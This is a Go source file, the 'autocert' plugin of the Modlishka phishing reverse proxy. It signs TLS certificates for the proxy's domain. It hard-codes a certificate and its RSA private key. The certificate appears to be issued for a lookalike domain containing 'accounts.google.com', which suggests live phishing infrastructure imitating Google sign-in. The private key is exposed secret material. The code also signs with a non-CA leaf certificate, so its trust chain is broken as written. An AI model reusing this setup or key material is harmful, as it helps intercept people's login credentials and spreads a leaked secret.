/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package plugin

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/pem"
	"math/big"
	"time"

	"github.com/drk1wi/Modlishka/config"
	"github.com/drk1wi/Modlishka/log"
)

// Paste your CA certificate and key in the following format
// Ref: https://github.com/drk1wi/Modlishka/wiki/Quickstart-tutorial

const CA_CERT = `-----BEGIN CERTIFICATE-----
MIIFwjCCBKqgAwIBAgISA7u+SpNxMiQCt44U9A6967+YMA0GCSqGSIb3DQEBCwUA
MEoxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MSMwIQYDVQQD
ExpMZXQncyBFbmNyeXB0IEF1dGhvcml0eSBYMzAeFw0yMDExMTcxNDMyNDdaFw0y
MTAyMTUxNDMyNDdaMB4xHDAaBgNVBAMMEyoudHJkdHJhbnNwb3J0ZS5jb20wggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCZSwdxDMmNQIKZyA2eGT9Kdqtz
C4SbXz0oUqE3P5XXrMymY4baI0Sz5iFWKe4i2ls9hxKTWn0WAYTrjfzCikbIzdPW
LmXnozi7AMCIhF5x1odIxYb3prdjnZt1d7WrDItAKI1LywQpIS8HFTHZ1Hvjvh43
YQMkWlMElV968IaAZrD7PbFwETHPmGTilJmiI7ssofrhO7W7UGrVOtDu3QCPM7fR
JKcYu89hUlA7fItICqUDUxiIw10N5KR4CcEmkSr1zptdsQOMvCi8NHJrWs65W9+E
ZBOgev7EHfX+kf8qBeXO3HY/eQEvCCj9ZMl0RZmBy9adlxpsKuR/33jMPTiLAgMB
AAGjggLMMIICyDAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYwFAYIKwYBBQUHAwEG
CCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFDQZBMPNmontKFsjAL41
IPjOzEUOMB8GA1UdIwQYMBaAFKhKamMEfd265tE5t6ZFZe/zqOyhMG8GCCsGAQUF
BwEBBGMwYTAuBggrBgEFBQcwAYYiaHR0cDovL29jc3AuaW50LXgzLmxldHNlbmNy
eXB0Lm9yZzAvBggrBgEFBQcwAoYjaHR0cDovL2NlcnQuaW50LXgzLmxldHNlbmNy
eXB0Lm9yZy8wgYAGA1UdEQR5MHeCJyouYWNjb3VudHMuZ29vZ2xlLmNvbS50cmR0
cmFuc3BvcnRlLmNvbYIXKi5jb20udHJkdHJhbnNwb3J0ZS5jb22CHiouZ29vZ2xl
LmNvbS50cmR0cmFuc3BvcnRlLmNvbYITKi50cmR0cmFuc3BvcnRlLmNvbTBMBgNV
HSAERTBDMAgGBmeBDAECATA3BgsrBgEEAYLfEwEBATAoMCYGCCsGAQUFBwIBFhpo
dHRwOi8vY3BzLmxldHNlbmNyeXB0Lm9yZzCCAQUGCisGAQQB1nkCBAIEgfYEgfMA
8QB2AG9Tdqwx8DEZ2JkApFEV/3cVHBHZAsEAKQaNsgiaN9kTAAABddbWREcAAAQD
AEcwRQIgO6V4copD8/XKX88Co/KzW46oVASja4cxpd8dLvKq1zcCIQCdWvwxKiNY
504Kqr5aC6e8KqTS1NRu6sEMZ95WT6ChHAB3AH0+8viP/4hVaCTCwMqeUol5K8UO
eAl/LmqXaJl+IvDXAAABddbWRF4AAAQDAEgwRgIhAJbgDj1Q7tnX37xgTs4s7Obk
pZoTU5yWZZLaywfonxfBAiEAlurudKIRZCetNqWIKvK+UbMEKAqabfBWApFX/GoY
8aYwDQYJKoZIhvcNAQELBQADggEBAHfWkG2DZHSxeCblhfpFGL8/579xd0KG4UwL
tfXhgrqlcU1RBp5AHGnArAFHkZTWprtT3SsW6Ob19xCbj0GwOtzFVyMfzZR4mppD
ATxhiE2dGFaWTzXTaq9ItofsBhIcEFeV0CCeiMpwL0WTxXT0RxSR1+wNjUIWnmWb
Cy+6fw9lgtrL+Nvo6ooMeNrc/o6sPZiyzVFsjNooP1wPKKGiDLiNg/h7fSf9qPzT
WFRaw82QAKLMcE3elVwwIaKZ4v7ySuuZiSf00uwhWgEUE9z7xwF0H6vNcFRgRWuG
pGFeVjgubXM98dCNPV0TfrkZUU2rkthnl9LZco3SWN6/gQFw7G8=
-----END CERTIFICATE-----`

const CA_CERT_KEY = `-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAmUsHcQzJjUCCmcgNnhk/SnarcwuEm189KFKhNz+V16zMpmOG
2iNEs+YhVinuItpbPYcSk1p9FgGE6438wopGyM3T1i5l56M4uwDAiIRecdaHSMWG
96a3Y52bdXe1qwyLQCiNS8sEKSEvBxUx2dR7474eN2EDJFpTBJVfevCGgGaw+z2x
cBExz5hk4pSZoiO7LKH64Tu1u1Bq1TrQ7t0AjzO30SSnGLvPYVJQO3yLSAqlA1MY
iMNdDeSkeAnBJpEq9c6bXbEDjLwovDRya1rOuVvfhGQToHr+xB31/pH/KgXlztx2
P3kBLwgo/WTJdEWZgcvWnZcabCrkf994zD04iwIDAQABAoIBADQZfgP8NpxdaoXd
qlMrfYlPX+IP7hfofJ6xxr1CTSkqP7vlY7XL+tOxyW7BfYA2+n+k4rlWLeFGzuhI
L7nmyTwCSJco2dWqceOM0+MSKg9CvGQNTlvpO7cNoAKClyn1b3Z00eEKtPVNo/Ai
UfkY8KpsuVRVEn5OfJy4L+VWzj/hIGZTP92LMml16ZtUx9eVq58h3Z56zpqL0gVW
iL5OIUR6RL0DsE67cN20N9nJVJkJrvl3z0Qp1iUVPtLuGS/yJLHBipEHNbfWX9Lg
FRwjRc65SGXT1+kBC2Mcsd0oreYAfOJ9urgkiaje/Hm436/PQQt+sXtuFdzrqV74
ObYTMUECgYEAyML0mxjCRv5zCDYvm/UsMzsHw57qOv1QUQ1WBVmo/LauPIstIHyq
/saaDM0POZZFCqodxydOV+wx9qwKaku1wWTgEffevXuQVBOo6K6EXg5QDnbtxQ9n
I4DBkWZTnOWZbgPGKHcWAG0H0sxNXbybF2Fuj7n9HTICsdbNIw/X6FsCgYEAw3iJ
YM7ZOiibClJaJpw9BzXgxo10wE59AKSx8sPbChdTYU6PFU37z1Ozw1+zvsLHU6bk
uA+6Rk+EVtwxN/AJCHj6KgU8JAMaOhst9d0Dp7KegNEwXLd0Ng7KO+MsWa99d7xw
DU6ouR2p8Ct3oDXrdUqX7VUdEORaplgMjrdCZ5ECgYAnK7q0JEGLvovNN11UraKB
IGxkY7ZJ6jDoj5SQGK1bGX2nfHRCmXB3o2JdSwlEcChqa0TCHc4wY3pgKbMiiEEf
ScJaXyWLjPddIDTdqWdUPrCqEdRUlavHBpE+AFwiCb5E8+GO9aVKUfuryobx2iHc
jvsWefCD6MUT09hUlfvHbwKBgQCT2P3/7TS9Gq16NyPdBFvcslHbnG7sbfF6pRe7
iYyJq27zsNnkwWFvRd44LpDj/quJiDiDR9IbEFYG5PGNX89VSzvcwKzmiDo0LQ6s
Yok7NI1S3eb4mgIaSUGJ3qBTDbuW7z7Jse9IZTl+YUJQObhotQ0JBFHBzxcJrpuA
7vgZIQKBgADahzBlFKF0w5cbDkJiYxlh1FeWQy3NFzgnPROXsd0I+jGHlqruiW6P
37bf5NhRdGGT5dA2q9JJHvnXMrd1NeEf1LMtNfKPXwFMNkEE/OGdI7RmmCEiZrnl
lXdN8CO+U6Bg3woNUYw7qYvXuu99cbKgV2jkNwNEWfSoX5nuTITs
-----END RSA PRIVATE KEY-----`

func init() {

	s := Property{}

	s.Name = "autocert"
	s.Version = "0.1"
	s.Description = "This plugin is used to auto generate certificate for you . Really useful for testing different configuration flags against your targets. "

	s.Flags = func() {

		if *config.C.ForceHTTP == false {
			if len(*config.C.TLSCertificate) == 0 && len(*config.C.TLSKey) == 0 {

				log.Infof("Autocert plugin: Auto-generating %s domain TLS certificate",*config.C.ProxyDomain)

				CAcert := CA_CERT
				CAkey := CA_CERT_KEY

				catls, err := tls.X509KeyPair([]byte(CAcert), []byte(CAkey))
				if err != nil {
					panic(err)
				}
				ca, err := x509.ParseCertificate(catls.Certificate[0])
				if err != nil {
					panic(err)
				}

				var n int32
				binary.Read(rand.Reader, binary.LittleEndian, &n)

				template := &x509.Certificate{
					IsCA:                  false,
					BasicConstraintsValid: true,
					SubjectKeyId:          []byte{1, 2, 3},
					SerialNumber:          big.NewInt(int64(n)),
					DNSNames:              []string{*config.C.ProxyDomain, "*." + *config.C.ProxyDomain},
					Subject: pkix.Name{
						Country:      []string{"Earth"},
						Organization: []string{"Mother Nature"},
						CommonName:   *config.C.ProxyDomain,
					},
					NotBefore: time.Now(),
					NotAfter:  time.Now().AddDate(5, 5, 5),
				}

				// generate private key
				privatekey, err := rsa.GenerateKey(rand.Reader, 2048)

				if err != nil {
					log.Errorf("Error generating key: %s", err)
				}
				var privateKey = &pem.Block{
					Type:  "PRIVATE KEY",
					Bytes: x509.MarshalPKCS1PrivateKey(privatekey),
				}

				//dump
				buf := new(bytes.Buffer)
				pem.Encode(buf, privateKey)
				tlskeyStr := buf.String()
				config.C.TLSKey = &tlskeyStr
				log.Debugf("AutoCert plugin generated TlsKey:\n %s", *config.C.TLSKey)

				// generate self signed cert
				publickey := &privatekey.PublicKey

				// create a self-signed certificate. template = parent
				//var parent = template
				var parent = ca

				cert, err := x509.CreateCertificate(rand.Reader, template, parent, publickey, catls.PrivateKey)

				buf = new(bytes.Buffer)
				pem.Encode(buf, &pem.Block{Type: "CERTIFICATE", Bytes: cert})

				tlscertStr := buf.String()
				config.C.TLSCertificate = &tlscertStr
				log.Debugf("AutoCert plugin generated TlsCert:\n %s", *config.C.TLSCertificate)

				//the cert is auto-generated anyway
				*config.C.TLSPool = ""

				if err != nil {
					log.Errorf("Error creating certificate: %s", err)
				}

			}
		}

	}

	// Register all the function hooks
	s.Register()
}
